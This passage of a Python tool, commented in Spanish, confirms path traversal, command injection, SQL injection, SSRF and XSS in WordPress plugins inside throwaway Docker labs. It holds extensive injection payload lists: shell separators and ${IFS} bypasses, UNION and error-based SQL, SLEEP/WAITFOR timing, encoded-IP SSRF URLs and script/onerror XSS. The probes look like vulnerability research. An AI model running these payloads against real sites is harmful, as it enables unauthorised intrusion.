                    step((f"VERIFICADO: /etc/passwd aparecio literal en la respuesta con "
                         f"{path_param}={payload_value!r} (via {follow_url})" if follow_url else
                         f"VERIFICADO: /etc/passwd aparecio literal en la respuesta con "
                         f"{path_param}={payload_value!r}."))
                    break
            res.evidence["intentos_etc_passwd"] = tried_passwd
        res.evidence["intentos"] = tried
        if found and res.evidence.get("objetivo_ganador") == "/etc/passwd":
            res.verified = True
            res.ok = True
            res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {path_param}="
                          f"{res.evidence['payload_ganador']!r} devolvio /etc/passwd literal "
                          f"(el canario propio no se confirmo, pero /etc/passwd -- el objetivo "
                          f"exacto del PoC publico -- si; el traversal es real, algo especifico "
                          f"del canario/su ruta lo bloqueaba)")
        elif found:
            res.verified = True
            res.ok = True
            res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {path_param}="
                          f"{res.evidence['payload_ganador']!r} devolvio el secreto exacto "
                          f"plantado en {canary_path} (fuera del directorio web)")
        else:
            res.ok = True
            # el cuerpo real del PRIMER intento (la ruta absoluta sin tocar, la mas simple de
            # las 40 -- si el endpoint no sanea nada, es la que mas deberia parecerse a lo que
            # el PoC publico ya demostro) es la pista mas util para diagnosticar un negativo sin
            # tener que repetir el ataque a mano ni leer el codigo del plugin: un error de la
            # propia app (p.ej. "File is not moved") apunta a algo del servidor (permisos del
            # fichero canario, una ruta que la app rechaza...), no a que el payload sea el
            # equivocado.
            sample = next((t.get("respuesta_cuerpo_recorte") for t in tried
                          if t.get("respuesta_cuerpo_recorte")), "")
            res.detail = (f"se probaron {len(tried)} variantes de ruta para {path_param} y "
                          f"ninguna devolvio el secreto plantado, ni /etc/passwd literal -- el "
                          f"traversal no se confirmo (puede necesitar otra profundidad de "
                          f"'../', otra codificacion, o el endpoint/parametro no son los reales)" +
                          (f". Respuesta real del primer intento: {sample!r}" if sample else ""))
        res.evidence["screenshots"] = boot.shots
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()


def verify_wordpress_command_injection(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, cmd_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Verifica command/OS injection probando que el servidor remoto EVALUA aritmetica que nunca
    se le mando literal: el payload pide `$(( a + b ))` para dos numeros aleatorios y, si la
    respuesta contiene la SUMA (y la suma no aparece en ningun punto del payload enviado, solo
    los dos operandos por separado), es prueba inequivoca de que un shell remoto ejecuto el
    comando -- no una deduccion por status code ni por reflejo literal del input."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    cmd_param = cmd_param_hint or _pick_param(parameters, _CMD_HINTS)
    if not cmd_param:
        res.detail = "no se identifico el parametro que llega al comando del sistema"
        res.limitations.append("la verificacion de command injection necesita saber que "
                               "parametro llega al comando; afina 'parameters' en la hipotesis "
                               "del LLM o pasalo a mano (cmd_param_hint)")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
        expected = a + b
        calc = f"$(( {a} + {b} ))"
        attempts = [
            # separadores de comando estandar (sh/bash/dash/ash)
            f"; echo {calc}", f"| echo {calc}", f"&& echo {calc}", f"|| echo {calc}",
            f"& echo {calc}",
            f"\necho {calc}\n", f"\r\necho {calc}\r\n",
            # sustitucion de comandos (funciona aunque el valor ya este entre comillas/concatenado)
            f"`echo {calc}`", f"$(echo {calc})",
            # rotura de contexto de comillas antes del separador (cuando el codigo envuelve el
            # valor en comillas simples/dobles antes de pasarlo al shell)
            f"' ; echo {calc} ; '", f'" ; echo {calc} ; "',
            f"' && echo {calc} && echo '", f'" && echo {calc} && echo "',
            f"' | echo {calc} #", f'" | echo {calc} #',
            # bypass de filtro de espacios (sustituir ' ' por ${IFS} o %09, comun cuando el codigo
            # bloquea el caracter espacio pero no el separador de comando)
            f";echo${{IFS}}{calc}", f";echo%09{calc}",
            # PowerShell (si el plugin invoca un binario via proc_open/shell_exec en Windows)
            f"; powershell -c \"{calc}\"", f"| powershell -c \"{calc}\"",
            # el valor entero como comando (si el parametro ES el comando completo, no un
            # argumento que se concatena a otro)
            f"echo {calc}", calc,
        ]
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "cmd_param": cmd_param, "a": a, "b": b, "suma_esperada": expected,
            "metodo": (http_method or "GET").upper(), "endpoint": endpoint,
        })

        m = (http_method or "GET").upper()
        pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
        found = False
        tried = []
        for payload_value in attempts:
            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
            payload[cmd_param] = payload_value
            step(f"probando {m} {endpoint} con {cmd_param}={payload_value!r}...")
            try:
                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20)
            except Exception as e:
                tried.append({"payload": payload_value, "error": str(e)})
                continue
            matched = bool(pattern.search(resp.text or ""))
            tried.append({"payload": payload_value, "status": resp.status_code, "suma_presente": matched})
            if matched:
                found = True
                res.evidence["payload_ganador"] = payload_value
                res.evidence["status_code_respuesta"] = resp.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                step(f"VERIFICADO: la respuesta contiene {expected} (={a}+{b}), calculado por un "
                     f"shell remoto -- ese numero no aparece en el payload enviado.")
                step("capturando pantalla: la respuesta HTTP con la suma calculada por el shell "
                     "remoto (prueba final)...")
                shot_url = (boot.base_url + endpoint
                           + ("&" if "?" in endpoint else "?")
                           + f"{cmd_param}={payload_value}") if m == "GET" else None
                if shot_url:
                    boot.capture(boot.sub_sess, shot_url[len(boot.base_url):],
                           f"Paso 5: EJECUCION DE COMANDOS confirmada -- la respuesta contiene "
                           f"{expected} (={a}+{b}), que solo pudo calcularse ejecutando aritmetica "
                           f"en un shell remoto, no reflejando el payload enviado.",
                           f"Step 5: COMMAND EXECUTION confirmed -- the response contains "
                           f"{expected} (={a}+{b}), which could only come from arithmetic "
                           f"evaluated by a remote shell, not from reflecting the sent payload.")
                break
        res.evidence["intentos"] = tried

        # fallback blind/time-based: si ninguna variante devolvio la suma en la respuesta (p.ej.
        # porque el comando se ejecuta pero su salida nunca se refleja -- "blind" command
        # injection), se mide el RETRASO real que un `sleep` inyectado provoca, comparado contra
        # una peticion de control -- si el servidor tarda sistematicamente ~N segundos mas con el
        # sleep que sin el, es prueba de ejecucion aunque no haya salida visible.
        sleep_evidence = None
        if not found:
            step("ninguna variante reflejo la suma; probando blind command injection por "
                 "temporizacion (sleep)...")
            base_payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
            base_payload[cmd_param] = "1"
            try:
                t_base0 = time.time()
                boot.sub_sess.request(m, boot.base_url + endpoint,
                                      data=base_payload if m != "GET" else None,
                                      params=base_payload if m == "GET" else None, timeout=20)
                baseline_s = time.time() - t_base0
            except Exception:
                baseline_s = None
            sleep_n = 6
            sleep_attempts = [f"; sleep {sleep_n}", f"| sleep {sleep_n}", f"`sleep {sleep_n}`",
                              f"$(sleep {sleep_n})", f"&& sleep {sleep_n}"]
            for sp in sleep_attempts:
                payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
                payload[cmd_param] = sp
                step(f"probando {m} {endpoint} con {cmd_param}={sp!r} (temporizacion)...")
                try:
                    t0_s = time.time()
                    boot.sub_sess.request(m, boot.base_url + endpoint,
                                          data=payload if m != "GET" else None,
                                          params=payload if m == "GET" else None,
                                          timeout=sleep_n + 15)
                    elapsed = time.time() - t0_s
                except Exception:
                    continue
                delayed = (baseline_s is not None and elapsed - baseline_s >= sleep_n - 1.5)
                sleep_evidence = {"payload": sp, "baseline_s": round(baseline_s, 2) if baseline_s else None,
                                  "elapsed_s": round(elapsed, 2), "retraso_consistente": delayed}
                if delayed:
                    found = True
                    res.evidence["payload_ganador"] = sp
                    res.evidence["tecnica"] = "blind-timing"
                    step(f"VERIFICADO (blind/timing): la peticion con {sp!r} tardo {elapsed:.1f}s "
                         f"frente a {baseline_s:.1f}s de control -- el shell remoto ejecuto "
                         f"'sleep {sleep_n}', no se ve la salida pero el retraso lo confirma.")
                    break
            res.evidence["blind_timing_intento"] = sleep_evidence

        if found:
            res.verified = True
            res.ok = True
            if res.evidence.get("tecnica") == "blind-timing":
                res.detail = (f"COMMAND INJECTION confirmada (blind/timing): la peticion con "
                              f"{cmd_param}={res.evidence['payload_ganador']!r} retraso la "
                              f"respuesta de forma consistente con 'sleep {sleep_n}' ejecutandose "
                              f"de verdad en un shell remoto -- no hay salida visible, pero el "
                              f"retraso medido es la prueba")
            else:
                res.detail = (f"COMMAND INJECTION confirmada: la peticion con {cmd_param}="
                              f"{res.evidence['payload_ganador']!r} hizo que el servidor "
                              f"EJECUTARA {a}+{b} y devolviera {expected} en la respuesta -- "
                              f"prueba inequivoca de ejecucion remota de comandos (el payload "
                              f"enviado no contiene el numero {expected} en ningun punto)")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de inyeccion (arimetica reflejada) "
                          f"y {len(sleep_evidence and [sleep_evidence] or [])} de timing ciega "
                          f"para {cmd_param}, y ninguna confirmo la suma esperada ({a}+{b}="
                          f"{expected}) ni un retraso consistente -- la inyeccion de comandos no "
                          f"se confirmo (puede necesitar otro separador de comandos, otro shell, "
                          f"o el endpoint/parametro no son los reales)")
        res.evidence["screenshots"] = boot.shots
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()


def verify_wordpress_sqli(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, sqli_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    setup_wp_options: Optional[list] = None,
) -> WpVerifyResult:
    """Verifica SQL injection con TRES tecnicas, de mas a menos dura, probando varios contextos
    de inyeccion (numerico sin comillas, comilla simple, comilla doble, cierre de parentesis) y
    estilos de comentario (-- -, #) en cada una, porque el contexto real del query no se puede
    saber sin leer el codigo:

    1) error-based (prueba dura, mas rapida -- sin fuerza bruta de columnas): extractvalue()/
       updatexml() provocan un error de sintaxis XPATH cuyo mensaje INCLUYE el resultado de la
       subconsulta; si version() aparece en la respuesta por esta via, es dato real forzado a
       salir en un mensaje de error, no una coincidencia.
    2) UNION-based (prueba dura): fuerza bruta del numero de columnas (1-8) probando `version()`
       en cada posicion, para cada contexto/comentario; si una version REAL del motor (que no
       estaba en la respuesta base) aparece en la respuesta, es dato extraido de verdad de la
       base de datos -- no una deduccion.
    3) boolean-blind diferencial (mas debil, solo si (1) y (2) no filtraron nada): compara pares
       de condiciones TRUE/FALSE inyectadas; se marca verificado solo si al menos 2 de 3 pares
       muestran una diferencia de respuesta CONSISTENTE y el caso TRUE se comporta como la
       peticion de control.
    4) time-based blind (ultimo recurso, si ninguna de las anteriores funciono): SLEEP(5) vs
       SLEEP(0) en la misma condicion -- si el retraso es consistente en al menos 2 de 3 pares,
       es indicio de inyeccion ciega sin ninguna diferencia visible en el contenido.

    `detail` deja explicito con cual de las tecnicas se confirmo, para que el analista sepa que
    tan dura es la prueba."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    params_list = list(parameters.keys()) if isinstance(parameters, dict) else list(parameters or [])
    sqli_param = sqli_param_hint or _pick_param(parameters, _SQLI_HINTS) or (params_list[0] if params_list else "")
    if not sqli_param:
        res.detail = "no se identifico el parametro a inyectar"
        res.limitations.append("la verificacion de SQLi necesita al menos un parametro; afina "
                               "'parameters' en la hipotesis del LLM o pasalo a mano "
                               "(sqli_param_hint)")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              setup_wp_options=setup_wp_options)
        if boot is None:
            return res

        m = (http_method or "GET").upper()
        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "1" for p in (parameters or [])}
        orig_value = str(base_params.get(sqli_param) or "1")

        def send(val):
            payload = dict(base_params)
            payload[sqli_param] = val
            return boot.sub_sess.request(m, boot.base_url + endpoint,
                               data=payload if m != "GET" else None,
                               params=payload if m == "GET" else None, timeout=20)

        res.evidence.update({"login_bajo_privilegio": boot.sub_user,
                             "login_bajo_privilegio_password": boot.sub_pass,
                             "sqli_param": sqli_param, "metodo": m, "endpoint": endpoint})

        step("peticion de control (sin inyeccion)...")
        try:
            base_resp = send(orig_value)
        except Exception as e:
            res.detail = f"la peticion de control fallo: {e}"
            return res
        base_len = len(base_resp.text or "")
        version_noise = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", base_resp.text or ""))
        # contextos de inyeccion: el query real puede envolver el valor en comillas simples,
        # dobles, un parentesis, o nada (contexto numerico) -- probar los cuatro en vez de asumir
        # uno solo evita fallar por adivinar mal el contexto, no por no haber inyeccion de verdad.
        contexts = ["'", '"', "", "')", '")']
        comments = ["-- -", "#"]

        step("probando error-based (extractvalue/updatexml) para extraer version() real...")
        error_tried = []
        error_found = None
        for ctx in contexts:
            for fn in ("extractvalue(1,concat(0x7e,version()))", "updatexml(1,concat(0x7e,version()),1)"):
                for cm in comments:
                    payload_val = f"{orig_value}{ctx} AND {fn}{cm}"
                    try:
                        r = send(payload_val)
                    except Exception as e:
                        error_tried.append({"payload": payload_val, "error": str(e)})
                        continue
                    new_versions = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "")) - version_noise
                    error_tried.append({"payload": payload_val, "status": r.status_code,
                                        "version_nueva": sorted(new_versions)})
                    if new_versions:
                        error_found = (payload_val, sorted(new_versions)[0], r)
                        break
                if error_found:
                    break
            if error_found:
                break

        if error_found:
            payload_val, mysql_version, r = error_found
            res.verified = True
            res.ok = True
            res.evidence["tecnica"] = "error-based"
            res.evidence["payload_ganador"] = payload_val
            res.evidence["mysql_version_extraida"] = mysql_version
            res.evidence["status_code_respuesta"] = r.status_code
            res.evidence["respuesta_cuerpo_recorte"] = (r.text or "")[:500]
            res.evidence["error_based_intentos"] = error_tried
            res.detail = (f"SQLI confirmada (error-based): la peticion con {sqli_param}=... "
                          f"provoco un error de sintaxis (extractvalue/updatexml) cuyo mensaje "
                          f"incluyo la version real de la base de datos ({mysql_version}) -- "
                          f"dato real forzado a salir en un mensaje de error, no una coincidencia")
            step(f"VERIFICADO (error-based): version real del motor filtrada en el mensaje de "
                 f"error: {mysql_version}")
            if m == "GET":
                shot_url = (boot.base_url + endpoint + ("&" if "?" in endpoint else "?")
                           + f"{sqli_param}={payload_val}")
                boot.capture(boot.sub_sess, shot_url[len(boot.base_url):],
                       f"Paso 5: SQL INJECTION confirmada (error-based) -- el mensaje de error "
                       f"contiene la version real del motor ({mysql_version}).",
                       f"Step 5: SQL INJECTION confirmed (error-based) -- the error message "
                       f"contains the database engine's real version ({mysql_version}).")
            res.evidence["screenshots"] = boot.shots
            return res
        res.evidence["error_based_intentos_resumen"] = (f"{len(error_tried)} combinaciones "
                                                         f"probadas, ninguna filtro version()")

        step("error-based no filtro nada; probando UNION-based (fuerza bruta de columnas) para "
             "extraer version() real...")
        union_tried = []
        union_found = None
        for ctx in contexts:
            for cm in comments:
                for n in range(1, 9):
                    for pos in range(n):
                        cols = ["NULL"] * n
                        cols[pos] = "version()"
                        payload_val = f"{orig_value}{ctx} UNION SELECT {','.join(cols)}{cm}"
                        try:
                            r = send(payload_val)
                        except Exception as e:
                            union_tried.append({"payload": payload_val, "error": str(e)})
                            continue
                        new_versions = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "")) - version_noise
                        union_tried.append({"payload": payload_val, "status": r.status_code,
                                            "version_nueva": sorted(new_versions)})
                        if new_versions:
                            union_found = (payload_val, sorted(new_versions)[0], r)
                            break
                    if union_found:
                        break
                if union_found:
                    break
            if union_found:
                break

        if union_found:
            payload_val, mysql_version, r = union_found
            res.verified = True
            res.ok = True
            res.evidence["tecnica"] = "union-based"
            res.evidence["payload_ganador"] = payload_val
            res.evidence["mysql_version_extraida"] = mysql_version
            res.evidence["status_code_respuesta"] = r.status_code
            res.evidence["respuesta_cuerpo_recorte"] = (r.text or "")[:500]
            res.evidence["union_intentos"] = union_tried
            res.detail = (f"SQLI confirmada (UNION-based): la peticion con {sqli_param}=... hizo "
                          f"que la base de datos devolviera su version real ({mysql_version}) "
                          f"dentro de la respuesta -- version() nunca aparece en una respuesta "
                          f"normal, es dato extraido de verdad, no una deduccion por diferencia "
                          f"de contenido")
            step(f"VERIFICADO (UNION-based): version real del motor filtrada en la respuesta: "
                 f"{mysql_version}")
            if m == "GET":
                shot_url = (boot.base_url + endpoint + ("&" if "?" in endpoint else "?")
                           + f"{sqli_param}={payload_val}")
                boot.capture(boot.sub_sess, shot_url[len(boot.base_url):],
                       f"Paso 5: SQL INJECTION confirmada -- la respuesta contiene la version "
                       f"real del motor de base de datos ({mysql_version}), extraida via UNION "
                       f"SELECT.",
                       f"Step 5: SQL INJECTION confirmed -- the response contains the database "
                       f"engine's real version ({mysql_version}), extracted via UNION SELECT.")
            res.evidence["screenshots"] = boot.shots
            return res

        res.evidence["union_intentos_resumen"] = (f"{len(union_tried)} combinaciones probadas, "
                                                   f"ninguna filtro version()")
        step("UNION no filtro nada; probando boolean-based (diferencial TRUE/FALSE)...")
        pairs = [
            (f"{orig_value}' OR '1'='1", f"{orig_value}' OR '1'='2"),
            (f"{orig_value}' AND '1'='1", f"{orig_value}' AND '1'='2"),
            (f'{orig_value}" OR "1"="1', f'{orig_value}" OR "1"="2'),
            (f"{orig_value}') OR ('1'='1", f"{orig_value}') OR ('1'='2"),
            (f"{orig_value} OR 1=1", f"{orig_value} OR 1=2"),
        ]
        bool_tried = []
        consistent_diffs = 0
        for true_p, false_p in pairs:
            try:
                rt = send(true_p)
                rf = send(false_p)
            except Exception as e:
                bool_tried.append({"true": true_p, "false": false_p, "error": str(e)})
                continue
            lt, lf = len(rt.text or ""), len(rf.text or "")
            threshold = max(20, 0.05 * base_len)
            differs = (rt.status_code != rf.status_code) or (abs(lt - lf) > threshold)
            matches_base = abs(lt - base_len) <= threshold
            bool_tried.append({"true": true_p, "false": false_p, "status_true": rt.status_code,
                               "status_false": rf.status_code, "len_true": lt, "len_false": lf,
                               "difiere": differs, "true_coincide_con_base": matches_base})
            if differs and matches_base:
                consistent_diffs += 1
        res.evidence["boolean_intentos"] = bool_tried

        if consistent_diffs >= 2:
            res.verified = True
            res.ok = True
            res.evidence["tecnica"] = "boolean-blind-differential"
            res.detail = (f"SQLI probable (boolean-blind, diferencial): {consistent_diffs}/"
                          f"{len(pairs)} pares TRUE/FALSE mostraron una diferencia consistente de "
                          f"respuesta (y el caso TRUE se comporto como la peticion de control) -- "
                          f"indicio fuerte de inyeccion ciega, aunque sin dato extraido literal "
                          f"(menos duro que el UNION/error-based)")
            step(f"VERIFICADO (boolean-blind): {consistent_diffs}/{len(pairs)} pares mostraron "
                 f"diferencia consistente")
            res.evidence["screenshots"] = boot.shots
            return res

        # ultimo recurso: time-based blind. Si el contenido/longitud de la respuesta nunca cambia
        # (p.ej. la pagina siempre devuelve lo mismo independientemente del resultado del query),
        # SLEEP(5) vs SLEEP(0) en la misma condicion mide un retraso real en vez de comparar texto.
        step("boolean-blind no mostro diferencia; probando time-based blind (SLEEP/pg_sleep/"
             "WAITFOR)...")
        # MySQL SLEEP() en varios contextos, mas pg_sleep() (PostgreSQL) y WAITFOR DELAY (MSSQL,
        # via query apilada con ';' -- motor distinto, sintaxis distinta, se prueban los tres en
        # vez de asumir MySQL) -- casuistica real de SQL Injection/Intruder/Generic_TimeBased.txt
        # en PayloadsAllTheThings.
        timing_pairs = [
            (f"{orig_value}' AND SLEEP(5)-- -", f"{orig_value}' AND SLEEP(0)-- -"),
            (f"{orig_value} AND SLEEP(5)-- -", f"{orig_value} AND SLEEP(0)-- -"),
            (f"{orig_value}' OR SLEEP(5)-- -", f"{orig_value}' OR SLEEP(0)-- -"),
            (f"{orig_value}' AND pg_sleep(5)-- -", f"{orig_value}' AND pg_sleep(0)-- -"),
            (f"{orig_value} AND pg_sleep(5)-- -", f"{orig_value} AND pg_sleep(0)-- -"),
            (f"{orig_value}';WAITFOR DELAY '0:0:5'--", f"{orig_value}';WAITFOR DELAY '0:0:0'--"),
            (f"{orig_value});WAITFOR DELAY '0:0:5'--", f"{orig_value});WAITFOR DELAY '0:0:0'--"),
        ]
        timing_tried = []
        timing_consistent = 0
        for slow_p, fast_p in timing_pairs:
            try:
                t0_f = time.time()
                send(fast_p)
                fast_s = time.time() - t0_f
                t0_sl = time.time()
                send(slow_p)
                slow_s = time.time() - t0_sl
            except Exception as e:
                timing_tried.append({"slow": slow_p, "fast": fast_p, "error": str(e)})
                continue
            delayed = (slow_s - fast_s) >= 3.5
            timing_tried.append({"slow": slow_p, "fast": fast_p, "slow_s": round(slow_s, 2),
                                 "fast_s": round(fast_s, 2), "retraso_consistente": delayed})
            if delayed:
                timing_consistent += 1
        res.evidence["timing_intentos"] = timing_tried

        if timing_consistent >= 2:
            res.verified = True
            res.ok = True
            res.evidence["tecnica"] = "time-based-blind"
            res.detail = (f"SQLI probable (time-based blind): {timing_consistent}/"
                          f"{len(timing_pairs)} pares SLEEP(5)/SLEEP(0) mostraron un retraso "
                          f"consistente de al menos ~3.5s -- indicio de inyeccion ciega sin "
                          f"ninguna diferencia visible en el contenido de la respuesta")
            step(f"VERIFICADO (time-based blind): {timing_consistent}/{len(timing_pairs)} pares "
                 f"mostraron retraso consistente")
        else:
            res.ok = True
            res.detail = (f"error-based ({len(error_tried)}) y UNION-based ({len(union_tried)}) "
                          f"no filtraron version(), boolean-blind no mostro diferencia consistente "
                          f"({consistent_diffs}/{len(pairs)}) y time-based blind tampoco "
                          f"({timing_consistent}/{len(timing_pairs)}) -- la inyeccion SQL no se "
                          f"confirmo")
        res.evidence["screenshots"] = boot.shots
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()


def verify_wordpress_ssrf(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, url_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Verifica SSRF levantando un contenedor 'callback' en la MISMA red Docker del laboratorio
    (no expuesto a internet, solo alcanzable desde dentro) y apuntando el parametro de URL/fichero
    remoto que la hipotesis cita hacia el, con un TOKEN aleatorio en la ruta. Si el endpoint
    vulnerable hace de verdad una peticion saliente, la conexion queda grabada en el log del
    listener con ese token exacto -- prueba de que el SERVIDOR (no el navegador del atacante)
    emitio la peticion, no una deduccion por status code o por tiempo de respuesta."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    url_param = url_param_hint or _pick_param(parameters, _URL_HINTS)
    if not url_param:
        res.detail = "no se identifico el parametro que lleva la URL/recurso remoto"
        res.limitations.append("la verificacion de SSRF necesita saber que parametro lleva la "
                               "URL remota; afina 'parameters' en la hipotesis del LLM o pasalo "
                               "a mano (url_param_hint)")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        step("levantando el contenedor 'callback' (listener) en la red interna del laboratorio...")
        listener = lab.start_listener()
        if not listener:
            res.detail = "no se pudo levantar el contenedor listener para SSRF"
            return res

        listener_ip = lab.container_ip(lab.listener)
        m = (http_method or "GET").upper()
        found = False
        tried = []

        def build_urls(tok: str) -> List[str]:
            path = f"binoracle-ssrf-{tok}"
            urls = [f"http://{lab.listener}:8080/{path}"]
            if listener_ip:
                parts = [int(x) for x in listener_ip.split(".")]
                dec = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
                hexip = "0x" + "".join(f"{x:02x}" for x in parts)
                octip = "0" + ".".join(f"{x:03o}" for x in parts)
                urls += [
                    f"http://{listener_ip}:8080/{path}",                         # IP literal
                    f"http://{dec}:8080/{path}",                                 # IP decimal
                    f"http://{hexip}:8080/{path}",                               # IP hex
                    f"http://{octip}:8080/{path}",                               # IP octal
                    f"http://trusted-host@{listener_ip}:8080/{path}",            # userinfo trick
                    f"http://{listener_ip}:8080@evil.invalid/{path}",            # userinfo (al reves)
                    f"http://{lab.listener}.:8080/{path}",                       # trailing dot DNS
                ]
            return urls

        for attempt_url in build_urls(_token()):
            token = attempt_url.rsplit("binoracle-ssrf-", 1)[-1]
            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
            payload[url_param] = attempt_url
            step(f"probando {m} {endpoint} con {url_param}={attempt_url!r}...")
            entry = {"url": attempt_url, "token": token}
            try:
                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20)
                entry["status"] = resp.status_code
            except Exception as e:
                entry["peticion_error"] = str(e)
            time.sleep(2)
            log = lab.listener_log()
            entry["token_en_log"] = token in log
            tried.append(entry)
            if token in log:
                found = True
                res.evidence["callback_url_ganadora"] = attempt_url
                res.evidence["token_ganador"] = token
                res.evidence["listener_log_recorte"] = log[:1000]
                break

        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "url_param": url_param, "listener_ip": listener_ip,
            "metodo": m, "endpoint": endpoint, "intentos": tried,
        })

        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"SSRF confirmado: el listener interno (inalcanzable desde fuera del "
                          f"laboratorio) recibio una conexion con el token exacto tras la "
                          f"peticion con {url_param}={res.evidence['callback_url_ganadora']!r} "
                          f"-- prueba de que el SERVIDOR emitio la peticion saliente, no el "
                          f"navegador del atacante")
            step(f"VERIFICADO: el listener interno recibio el token "
                 f"'{res.evidence['token_ganador']}' -- la peticion saliente la hizo el servidor.")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de URL/codificacion (hostname, IP "
                          f"literal, decimal, hex, octal, truco de userinfo) y ninguna hizo que "
                          f"el token llegara al listener interno -- el SSRF no se confirmo (puede "
                          f"que el endpoint/parametro no sean los reales, o que el servidor "
                          f"filtre de verdad las URLs internas antes de seguirlas)")
        res.evidence["screenshots"] = boot.shots
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()


def verify_wordpress_xss(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, xss_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Verifica XSS (reflejado, o almacenado cuando la propia respuesta lo renderiza de vuelta)
    cargando la respuesta del endpoint en un Chromium headless REAL (ver _xss_render): el payload
    pide cambiar document.title a un marcador aleatorio, y solo se marca verificado si el title
    final del navegador coincide EXACTO con ese marcador -- prueba de EJECUCION real de JS, no de
    que el payload simplemente aparezca en el HTML crudo de la respuesta (lo que no demuestra nada
    por si solo, ya mucho WAF/plugin escapa el eco sin impedir que aparezca literal en la pagina).
    Alcance: solo cubre el caso en que la MISMA respuesta a la peticion del ataque ya renderiza el
    payload (reflejado, o almacenado-y-mostrado-de-inmediato); un XSS almacenado que solo se ve en
    una pagina DISTINTA (p.ej. el panel del admin, en otra visita) necesitaria un segundo paso que
    esta version no automatiza."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    xss_param = xss_param_hint or _pick_param(parameters, _XSS_HINTS)
    if not xss_param:
        res.detail = "no se identifico el parametro donde se refleja el payload"
        res.limitations.append("la verificacion de XSS necesita saber que parametro se refleja; "
                               "afina 'parameters' en la hipotesis del LLM o pasalo a mano "
                               "(xss_param_hint)")
        return res

    try:
        from playwright.sync_api import sync_playwright  # noqa: F401
    except Exception:
        res.available = False
        res.detail = ("Playwright no esta instalado: la verificacion de XSS necesita un "
                     "navegador real para confirmar EJECUCION, no basta ver el payload reflejado "
                     "en el HTML crudo")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        from urllib.parse import urlsplit
        host = urlsplit(boot.base_url).hostname or "127.0.0.1"
        cookies = [{"name": c.name, "value": c.value, "domain": host, "path": "/"}
                  for c in boot.sub_sess.cookies]

        token = _token()
        marker = f"binoracle-xss-{token}"
        js = f"document.title='{marker}'"
        attempts = [
            # contexto HTML normal (el payload cae directo en el cuerpo de la pagina)
            f"<script>{js}</script>",
            f"<img src=x onerror=\"{js}\">",
            f"<svg onload=\"{js}\">",
            f"<body onload=\"{js}\">",
